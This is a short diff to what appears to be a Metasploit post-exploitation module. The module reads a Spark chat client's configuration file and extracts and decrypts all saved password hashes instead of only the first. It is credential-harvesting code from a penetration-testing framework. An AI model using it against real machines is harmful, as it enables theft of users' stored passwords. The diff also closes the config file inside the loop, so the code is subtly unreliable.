@@ -102,12 +102,18 @@ class Metasploit3 < Msf::Post
 
 				# store the hash close the file
 				password = password.delete_if {|e| e !~ /password.+=.+=\r/}
-				hash = password[0].split("password").join.chomp
-				print_status("Spark password hash: #{hash}") if datastore['VERBOSE']
-				config.close
+				password.each do | pass |
+					if pass.nil?
+						next
+					end
 
-				# call to decrypt the hash
-				decrypt(hash)
+					hash = pass.split("password").join.chomp
+					print_status("Spark password hash: #{hash}") if datastore['VERBOSE']
+
+					# call method to decrypt hash
+					decrypt(hash)
+					config.close
+				end
 			end
 		end
 	end
